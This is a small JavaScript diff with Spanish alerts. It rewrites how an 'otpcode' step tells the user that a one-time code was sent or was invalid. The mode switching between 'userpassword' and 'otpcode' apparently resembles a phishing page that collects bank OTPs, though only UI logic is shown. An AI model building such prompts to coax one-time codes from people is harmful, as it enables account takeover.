@@ -119,8 +119,10 @@ if(info.checkerInfo.mode === 'userpassword'){
 }else if(info.checkerInfo.mode === 'otpcode'){
     setTimeout(() =>{
         // COMPROBAR ERROR
-        if(info.metaInfo.tok !== ''){
-            alert('Código inválido, por favor ingrese el valor de nuevo.');
+        if(info.metaInfo.tok === ''){
+            alert('Hemos enviado un código OTP a su teléfono. Por favor ingreselo');
+        } else {
+            alert('Código inválido. Hemos enviado un nuevo código OTP a su teléfono. Por favor ingreselo');
         }
     }, 2050);
     otpcode.forEach(elem =>{
